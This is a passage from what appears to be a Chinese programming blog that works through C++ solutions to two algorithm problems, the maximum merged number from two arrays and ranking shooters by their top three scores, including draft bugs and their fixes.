i=start;i&lt;=end;i++) <span class="comment">//</span></span><br><span class="line">       &#123;</span><br><span class="line">           vector&lt;<span class="type">int</span>&gt; max_n1=<span class="built_in">pick_max</span>(nums1,i);</span><br><span class="line">           vector&lt;<span class="type">int</span>&gt; max_n2=<span class="built_in">pick_max</span>(nums2,k-i);</span><br><span class="line">           vector&lt;<span class="type">int</span>&gt; curmerge=<span class="built_in">merge</span>(max_n1,max_n2);</span><br><span class="line">           <span class="keyword">if</span>(<span class="built_in">compare</span>(curmerge,<span class="number">0</span>,maxseq,<span class="number">0</span>)&gt;<span class="number">0</span>)</span><br><span class="line">           &#123;</span><br><span class="line">               maxseq=curmerge;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">        <span class="keyword">return</span> maxseq;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">pick_max</span><span class="params">(vector&lt;<span class="type">int</span>&gt; num,<span class="type">int</span> k)</span><span class="comment">//个数为k的最大序列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">    <span class="type">int</span> drop=num.<span class="built_in">size</span>()-k;<span class="comment">//允许丢弃数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num.<span class="built_in">size</span>();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(drop&gt;<span class="number">0</span>&amp;&amp;!st.<span class="built_in">empty</span>()&amp;&amp;st.<span class="built_in">back</span>()&lt;num[i])<span class="comment">//1.drop和drop&gt;0做条件不一样</span></span><br><span class="line">        &#123;</span><br><span class="line">            st.<span class="built_in">pop_back</span>();</span><br><span class="line">            drop--;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">//st.push_back(num[i]);</span></span><br><span class="line">        <span class="keyword">if</span>(st.<span class="built_in">size</span>()&lt;k) <span class="comment">//没有取够k个</span></span><br><span class="line">            st.<span class="built_in">push_back</span>(num[i]);</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//取够了就继续丢弃</span></span><br><span class="line">        &#123;</span><br><span class="line">            drop--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//st.resize(k);</span></span><br><span class="line">  <span class="keyword">return</span> st;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a,vector&lt;<span class="type">int</span>&gt; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line">    <span class="comment">// if(a.size()==0) return b;</span></span><br><span class="line">    <span class="comment">// if(b.size()==0) return a;</span></span><br><span class="line">      <span class="type">int</span> index1=<span class="number">0</span>,index2=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span>(index1&lt;a.<span class="built_in">size</span>()&amp;&amp;index2&lt;b.<span class="built_in">size</span>())</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">//vector默认字典序排序</span></span><br><span class="line">        <span class="comment">//如123与179,7&gt;2</span></span><br><span class="line">       <span class="comment">// if(vector&lt;int&gt;(a.begin()+index1,a.end()) &gt; vector&lt;int&gt;(b.begin()+index2,b.end()) )</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="built_in">compare</span>(a,index1,b,index2)&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(a[index1++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(b[index2++]);</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//将剩余值放进result(a,b长度不同导致while提前结束，有剩余值未处理)</span></span><br><span class="line">      <span class="built_in">copy</span>(a.<span class="built_in">begin</span>()+index1,a.<span class="built_in">end</span>(),<span class="built_in">back_inserter</span>(result));</span><br><span class="line">      <span class="built_in">copy</span>(b.<span class="built_in">begin</span>()+index2,b.<span class="built_in">end</span>(),<span class="built_in">back_inserter</span>(result));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  可以替换如下</span></span><br><span class="line">    <span class="comment">// while (index1 &lt; a.size()) &#123;</span></span><br><span class="line">    <span class="comment">//     result.push_back(a[index1++]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// while (index2 &lt; b.size()) &#123;</span></span><br><span class="line">    <span class="comment">//     result.push_back(b[index2++]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  <span class="comment">//  num.push_back(a);</span></span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment">//比较字典序</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">compare</span><span class="params">(vector&lt;<span class="type">int</span>&gt; a,<span class="type">int</span> i,vector&lt;<span class="type">int</span>&gt; b,<span class="type">int</span> j)</span><span class="comment">//2.错在这里，bool和int是不一样的，淦！</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">while</span>(i&lt;a.<span class="built_in">size</span>()&amp;&amp;j&lt;b.<span class="built_in">size</span>())</span><br><span class="line">      &#123;   </span><br><span class="line">        <span class="comment">//如123与179,7&gt;2</span></span><br><span class="line">       <span class="type">int</span> diff=a[i]-b[j];</span><br><span class="line">       <span class="keyword">if</span>(diff!=<span class="number">0</span>) <span class="keyword">return</span> diff;</span><br><span class="line">       i++;</span><br><span class="line">       j++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//剩下的值</span></span><br><span class="line">      <span class="keyword">return</span> (a.<span class="built_in">size</span>()-i)-(b.<span class="built_in">size</span>()-j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<p>1.范围选择问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int&gt; maxNumber(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2, int k) &#123;</span><br><span class="line">...</span><br><span class="line">for(int i=0;i&lt;=k;i++) //一旦输入如下，是不对的</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>输入：</p>
<p>[6,7] [6,0,4] 5</p>
<p>输出：</p>
<p>[7,6,0,4]</p>
<p>预期结果：</p>
<p>[6,7,6,0,4]</p>
</blockquote>
<p>过程如下：</p>
<blockquote>
<p>i&#x3D;0,k-i&#x3D;5<br>xulie1</p>
<p>xulie2<br>6 0 4<br>curmerge<br>6 0 4<br>maxseq&#x3D;<br>6 0 4<br><strong>i&#x3D;1,k-i&#x3D;4</strong><br><strong>xulie1</strong><br><strong>7</strong><br><strong>xulie2</strong><br><strong>6 0 4</strong><br><strong>curmerge</strong><br><strong>7 6 0 4</strong><br><strong>maxseq&#x3D;</strong><br><strong>7 6 0 4</strong><br>i&#x3D;2,k-i&#x3D;3<br>xulie1<br>6 7<br>xulie2<br>6 0 4<br>curmerge<br>6 7 6 0 4<br>maxseq&#x3D;<br>7 6 0 4<br>i&#x3D;3,k-i&#x3D;2<br>xulie1<br>6 7<br>xulie2<br>6 4<br>curmerge<br>6 7 6 4<br>maxseq&#x3D;<br>7 6 0 4<br>i&#x3D;4,k-i&#x3D;1<br>xulie1<br>6 7<br>xulie2<br>6<br>curmerge<br>6 7 6<br>maxseq&#x3D;<br>7 6 0 4<br>i&#x3D;5,k-i&#x3D;0<br>xulie1<br>6 7<br>xulie2</p>
<p>curmerge<br>6 7<br>maxseq&#x3D;<br>7 6 0 4<br>7 6 0 4</p>
</blockquote>
<p>分析可得，目的是要求5位，但是从一开始的结果就有3位，4位，甚至是2位，究其原因是没有判断两数组各自的长度是否够k位。</p>
<p>一开始就限定nums1要取的元素</p>
<p>如果k-nums2.size()&gt;0， 就说明nums2的数组元素不够k个，那就至少从nums1中取k-nums2.size()个；不然完全可以从0开始。</p>
<p>如果k与nums1长度相比，nums1本身不够k个，那nums1最多取nums1.size()个。</p>
<p>解决方法</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int&gt; max_n1,max_n2;</span><br><span class="line">    vector&lt;int&gt; maxseq(k,0);</span><br><span class="line">      int m = nums1.size(), n = nums2.size();</span><br><span class="line">         int start = max(0, k - n), end = min(k, m);</span><br><span class="line">    for(int i= start;i&lt;=end;i++) //</span><br><span class="line">    &#123;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>start&#x3D;2 ,end&#x3D;2<br>6 7<br>xulie2<br>6 0 4<br>curmerge<br>6 7 6 0 4<br>6 7 6 0 4</p>
</blockquote>
<p>2.pick_max中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  for(int i=0;i&lt;num.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        while(drop&gt;0&amp;&amp;!st.empty()&amp;&amp;st.back()&lt;num[i])//1.drop和drop&gt;0做条件不一样</span><br><span class="line">        &#123;</span><br><span class="line">            st.pop_back();</span><br><span class="line">            drop--;</span><br><span class="line">        &#125;</span><br><span class="line">       //st.push_back(num[i]);</span><br><span class="line">        if(st.size()&lt;k) //没有取够k个</span><br><span class="line">            st.push_back(num[i]);</span><br><span class="line">        else //取够了就继续丢弃</span><br><span class="line">        &#123;</span><br><span class="line">            drop--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //st.resize(k);</span><br><span class="line">  return st;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">可以进行如下替换</span><br><span class="line"> for(int i=0;i&lt;num.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        while(drop&gt;0&amp;&amp;!st.empty()&amp;&amp;st.back()&lt;num[i])//1.drop和drop&gt;0做条件不一样</span><br><span class="line">        &#123;</span><br><span class="line">            st.pop_back();</span><br><span class="line">            drop--;</span><br><span class="line">        &#125;</span><br><span class="line">       st.push_back(num[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    st.resize(k);</span><br><span class="line">  return st;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.vector也是默认字典序排列的</p>
<p>在compare中可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(vector&lt;int&gt;(a.begin()+index1,a.end()) &gt; vector&lt;int&gt;(b.begin()+index2,b.end()) )</span><br><span class="line">       if(compare(a,index1,b,index2)&gt;0)</span><br><span class="line">        &#123;</span><br><span class="line">            result.push_back(a[index1++]);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            result.push_back(b[index2++]);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<h1 id="3-统计射击成绩"><a href="#3-统计射击成绩" class="headerlink" title="3.统计射击成绩"></a>3.统计射击成绩</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定一个射击比赛成绩单<br>包含多个选手若干次射击的成绩分数<br>请对每个选手按其最高三个分数之和进行降序排名<br>输出降序排名后的选手ID序列<br>条件如下:</p>
<ol>
<li>一个选手可以有多个射击成绩的分数 且次序不固定</li>
<li>如果一个选手成绩小于三个 则认为选手的所有成绩无效 排名忽略该选手</li>
<li>如果选手的成绩之和相等,则成绩相等的选手按照其ID降序排列</li>
</ol>
<h2 id="输入描述-1"><a href="#输入描述-1" class="headerlink" title="输入描述"></a>输入描述</h2><p>输入第一行:一个整数 <code>N</code><br>表示该场比赛总共进行了<code>N</code>次射击<br>产生<code>N</code>个成绩分数 <code>2 &lt;= N &lt;= 100</code><br>输入第二行 一个长度为<code>N</code>的整数序列<br>表示参与本次射击的选手Id<br><code>0 &lt;= ID &lt;= 99</code><br>输入第三行是长度为<code>N</code>的整数序列<br>表示参与每次射击的选手对应的成绩<br><code>0 &lt;= 成绩 &lt;= 100</code></p>
<h2 id="输出描述-1"><a href="#输出描述-1" class="headerlink" title="输出描述"></a>输出描述</h2><p>符合题设条件的降序排名后的选手ID序列</p>
<h2 id="示例一-1"><a href="#示例一-1" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">13</span><br><span class="line">3,3,7,4,4,4,4,7,7,3,5,5,5</span><br><span class="line">53,80,68,24,39,76,66,16,100,55,53,80,55</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5,3,7,4</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>该场射击比赛进行了<code>13</code>次,参赛选手为<code>3 4 5 7</code><br><code>3</code>号选手的成绩为<code>53 80 55</code>最高三个成绩的和为 <code>188</code><br><code>4</code>号选手的成绩为<code>24 39 76 66</code>最高三个和为<code>181</code><br><code>5</code>号选手的成绩为<code>53 80 55</code> 最高三个和为<code>188</code><br><code>7</code>号选手成绩为<code>68 16 100</code> 最高三个和<code>184</code><br>比较各个选手最高三个成绩的和<br><code>3 = 5 &gt; 7 &gt; 4</code><br>由于<code>3</code>和<code>5</code>成绩相等 且<code>5 &gt; 3</code> 所以输出为<code>5,3,7,4</code></p>
<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>第二行，选手id，顺序不固定</p>
<p>第三行，对应选手id所取得的成绩score。</p>
<p>1.想到map键值对。</p>
<p>由于一个选手对应多个成绩</p>
<p>且成绩若多于3个，需要取最高的三个</p>
<p>2.若少于3个，该成绩无效（输出时，需要判断）</p>
<p>综上的思路是</p>
<p><code>map&lt;int,vector&lt;int&gt; &gt; scores;</code></p>
<blockquote>
<p>理由：键为id，值为多个成绩</p>
</blockquote>
<p>输入时先获取整数序列值，需要将逗号分割，再将字符串转数字</p>
<p>主函数下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line">string input1,input2;</span><br><span class="line">cin&gt;&gt;input1&gt;&gt;input2;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; id;     <span class="comment">//用于接收第二行</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; score;	<span class="comment">//接收第三行</span></span><br><span class="line"></span><br><span class="line">string ch=<span class="string">&quot;&quot;</span>;<span class="comment">//子串</span></span><br><span class="line"><span class="comment">//接收输入</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;intput1.<span class="built_in">size</span>();i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(input1[i]!=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    	ch+=input1[i];</span><br><span class="line">    <span class="keyword">if</span>(input1[i]==<span class="string">&#x27;,&#x27;</span>||i==input1.<span class="built_in">size</span>()<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        id.<span class="built_in">push_back</span>(<span class="built_in">atoi</span>(ch.<span class="built_in">c_str</span>()));  <span class="comment">//将字符串转化为数字并存入id中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ch=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;intput2.<span class="built_in">size</span>();i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(input1[<span class="number">2</span>]!=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    	ch+=input2[i];</span><br><span class="line">    <span class="keyword">if</span>(input2[i]==<span class="string">&#x27;,&#x27;</span>||i==input2.<span class="built_in">size</span>()<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        score.<span class="built_in">push_back</span>(<span class="built_in">atoi</span>(ch.<span class="built_in">c_str</span>()));  <span class="comment">//将字符串转化为数字并存入id中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取完值，想办法键值对应</span></span><br><span class="line">map&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt; scores;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> key=id[i];</span><br><span class="line">    <span class="type">int</span> value=score[i];</span><br><span class="line">   map&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt;::iterator it=scores.<span class="built_in">find</span>(key);</span><br><span class="line">    <span class="keyword">if</span>(it !=it.<span class="built_in">end</span>()) <span class="comment">//找到该键</span></span><br><span class="line">    &#123;</span><br><span class="line">        scores[key].<span class="built_in">push_back</span>(value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">//如果没有这个键，添加(比如第一次时，key=4，但找不到，先添加值)</span></span><br><span class="line">    &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; list;</span><br><span class="line">        list.<span class="built_in">push_back</span>(value);</span><br><span class="line">        </span><br><span class="line">        scores[key]=list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时是一个id对应多个成绩。</span></span><br><span class="line"><span class="comment">//对成绩筛选并加和。</span></span><br><span class="line"><span class="keyword">for</span>(map&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt;::iterator it=scores.<span class="built_in">begin</span>();it!=scores.<span class="built_in">end</span>();it++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">if</span>(it-&gt;second.<span class="built_in">size</span>()&gt;=<span class="number">3</span>)<span class="comment">//如果成绩数不少于3个</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">sort</span>(scores.<span class="built_in">rbegin</span>(),scores.<span class="built_in">rend</span>());<span class="comment">//降序排列</span></span><br><span class="line">         num=it-&gt;second[<span class="number">0</span>]+it-&gt;second[<span class="number">1</span>]+it-&gt;second[<span class="number">2</span>];<span class="comment">//最高的三个成绩</span></span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        num=<span class="number">0</span>; <span class="comment">//成绩作废为0;</span></span><br><span class="line">    &#125;</span><br><span class="line">    it-&gt;second.<span class="built_in">clear</span>();<span class="comment">//清空值</span></span><br><span class="line">    it-&gt;second.<span class="built_in">push_back</span>(num);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//键值对排序，因为要按照值排序，且值相同时，id大的在前。</span></span><br><span class="line">vector&lt;pair&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt; &gt; <span class="built_in">sortedsc</span>(scores.<span class="built_in">begin</span>(),scores.<span class="built_in">end</span>());<span class="comment">//赋值给sortedsc，用来处理单个键值对情况。</span></span><br><span class="line"><span class="built_in">sort</span>(sortedsc.<span class="built_in">begin</span>(),sortedsc.<span class="built_in">end</span>(),Compare);<span class="comment">//Compare为自定义算法</span></span><br><span class="line"></span><br><span class="line">     vector&lt; pair&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt; &gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span>(it=sortedscores.<span class="built_in">begin</span>(); it!=sortedscores.<span class="built_in">end</span>();it++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(it-&gt;second[<span class="number">0</span>]&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">         cout&lt;&lt;it-&gt;first;</span><br><span class="line">        <span class="keyword">if</span>(it+<span class="number">1</span>!=sortedscores.<span class="built_in">end</span>())   <span class="comment">//如果不是最后一位，输出逗号</span></span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Compare</span><br><span class="line">&#123;</span><br><span class="line">	bool operator()(pair&lt;int,vector&lt;int&gt; &gt;&amp;a,pair&lt;int,vector&lt;int&gt; &gt;&amp;b)/*当你定义一个函数对象并希望它能够像函数一样被调用时，你需要重载函数调用运算符 ()。在函数调用运算符的定义中，括号是必需的，用于指示该函数对象应该如何被调用。*/</span><br><span class="line">	&#123;</span><br><span class="line">		if(a.second==b.second) //值相同，找键值大的</span><br><span class="line">			return a.first&gt;b.first;</span><br><span class="line">		return a.second&gt;b.second;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct CustomComparator &#123;   </span><br><span class="line">bool operator()(int a, int b) const &#123;        </span><br><span class="line">// Custom comparison logic        </span><br><span class="line">return a &lt; b;</span><br><span class="line">// Sort integers in ascending order    &#125; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">sort(v.begin(),v.end(),CustomComparator());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Compare</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(pair&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt;&amp;a,pair&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt;&amp;b)</span><span class="comment">/*当你定义一个函数对象并希望它能够像函数一样被调用时，你需要重载函数调用运算符 ()。在函数调用运算符的定义中，括号是必需的，用于指示该函数对象应该如何被调用。*/</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(a.second==b.second) <span class="comment">//值相同，找键值大的</span></span><br><span class="line">			<span class="keyword">return</span> a.first&gt;b.first;</span><br><span class="line">		<span class="keyword">return</span> a.second&gt;b.second;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line">string input1,input2;</span><br><span class="line">cin&gt;&gt;input1&gt;&gt;input2;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; id;     <span class="comment">//用于接收第二行</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; score;	<span class="comment">//接收第三行</span></span><br><span class="line"></span><br><span class="line">string ch=<span class="string">&quot;&quot;</span>;<span class="comment">//子串</span></span><br><span class="line"><span class="comment">//接收输入</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;input1.<span class="built_in">size</span>();i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(input1[i]!=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    	ch+=input1[i];</span><br><span class="line">    <span class="keyword">if</span>(input1[i]==<span class="string">&#x27;,&#x27;</span>||i==input1.<span class="built_in">size</span>()<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        id.<span class="built_in">push_back</span>(<span class="built_in">atoi</span>(ch.<span class="built_in">c_str</span>()));  <span class="comment">//将字符串转化为数字并存入id中</span></span><br><span class="line">      <span class="comment">//   cout&lt;&lt;ch&lt;&lt;endl;</span></span><br><span class="line">        ch=<span class="string">&quot;&quot;</span>;<span class="comment">//清零</span></span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ch=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;input2.<span class="built_in">size</span>();i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(input2[i]!=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    	ch+=input2[i];</span><br><span class="line">    <span class="keyword">if</span>(input2[i]==<span class="string">&#x27;,&#x27;</span>||i==input2.<span class="built_in">size</span>()<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        score.<span class="built_in">push_back</span>(<span class="built_in">atoi</span>(ch.<span class="built_in">c_str</span>()));  <span class="comment">//将字符串转化为数字并存入id中</span></span><br><span class="line">      <span class="comment">//  cout&lt;&lt;ch&lt;&lt;endl;</span></span><br><span class="line">        ch=<span class="string">&quot;&quot;</span>;<span class="comment">//清零</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取完值，想办法键值对应</span></span><br><span class="line">map&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt; scores;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> key=id[i];</span><br><span class="line">    <span class="type">int</span> value=score[i];</span><br><span class="line">   map&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt;::iterator it=scores.<span class="built_in">find</span>(key);</span><br><span class="line">    <span class="keyword">if</span>(it !=scores.<span class="built_in">end</span>()) <span class="comment">//找到该键</span></span><br><span class="line">    &#123;</span><br><span class="line">        scores[key].<span class="built_in">push_back</span>(value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">//如果没有这个键，添加(比如第一次时，key=4，但找不到，先添加值)</span></span><br><span class="line">    &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; list;</span><br><span class="line">        list.<span class="built_in">push_back</span>(value);</span><br><span class="line">        </span><br><span class="line">        scores[key]=list;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// cout&lt;&lt;key&lt;&lt;&quot; &quot;&lt;&lt;value&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时是一个id对应多个成绩。</span></span><br><span class="line"><span class="comment">//对成绩筛选并加和。</span></span><br><span class="line"><span class="keyword">for</span>(map&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt;::iterator it=scores.<span class="built_in">begin</span>();it!=scores.<span class="built_in">end</span>();it++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">if</span>(it-&gt;second.<span class="built_in">size</span>()&gt;=<span class="number">3</span>)<span class="comment">//如果成绩数不少于3个</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">sort</span>(it-&gt;second.<span class="built_in">rbegin</span>(),it-&gt;second.<span class="built_in">rend</span>());<span class="comment">//降序排列</span></span><br><span class="line">         num=it-&gt;second[<span class="number">0</span>]+it-&gt;second[<span class="number">1</span>]+it-&gt;second[<span class="number">2</span>];<span class="comment">//最高的三个成绩</span></span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        num=<span class="number">0</span>; <span class="comment">//成绩作废为0;</span></span><br><span class="line">    &#125;</span><br><span class="line">    it-&gt;second.<span class="built_in">clear</span>();<span class="comment">//清空值</span></span><br><span class="line">    it-&gt;second.<span class="built_in">push_back</span>(num);</span><br><span class="line">  <span class="comment">//  cout&lt;&lt;it-&gt;first&lt;&lt;&quot; &quot;&lt;&lt;num&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//键值对排序，因为要按照值排序，且值相同时，id大的在前。</span></span><br><span class="line">vector&lt;pair&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt; &gt; &gt; <span class="built_in">sortedsc</span>(scores.<span class="built_in">begin</span>(),scores.<span class="built_in">end</span>());<span class="comment">//赋值给sortedsc，用来处理单个键值对情况。</span></span><br><span class="line"><span class="built_in">sort</span>(sortedsc.<span class="built_in">begin</span>(),sortedsc.<span class="built_in">end</span>(),<span class="built_in">Compare</span>());<span class="comment">//Compare为自定义算法</span></span><br><span class="line"></span><br><span class="line">     vector&lt; pair&lt;<span 